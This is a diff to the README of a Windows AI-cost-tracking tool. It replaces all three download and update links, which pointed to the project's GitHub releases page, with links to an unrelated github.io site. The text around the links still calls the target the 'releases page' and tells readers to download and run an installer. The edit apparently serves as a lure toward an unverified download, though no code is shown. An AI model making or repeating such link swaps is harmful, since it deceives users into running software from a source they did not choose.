@@ -1,6 +1,6 @@
 # 📊 cage-ai-cost-tracker - Track AI Costs with Confidence
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://unstratifiedlanguagematriculate603.github.io)
 
 Cage helps you measure how much you spend on AI services like ChatGPT, Claude, and Gemini. It compares AI costs to human work costs so you can see your real savings.
 
@@ -26,7 +26,7 @@ Cage works on most modern Windows computers. If your computer runs Windows 10 or
 
 Visit the Cage releases page to get the latest version.
 
-**[Download Cage for Windows](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)**
+**[Download Cage for Windows](https://unstratifiedlanguagematriculate603.github.io)**
 
 On the releases page:
 1. Find the newest release at the top
@@ -176,7 +176,7 @@ Type `cage reset` and press Enter. Cage deletes all saved data and starts fresh.
 
 Cage checks for updates when you start it. When an update is available:
 
-1. Visit the [Cage releases page](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)
+1. Visit the [Cage releases page](https://unstratifiedlanguagematriculate603.github.io)
 2. Download the new version
 3. Run the installer
 4. Your data stays safe during updates
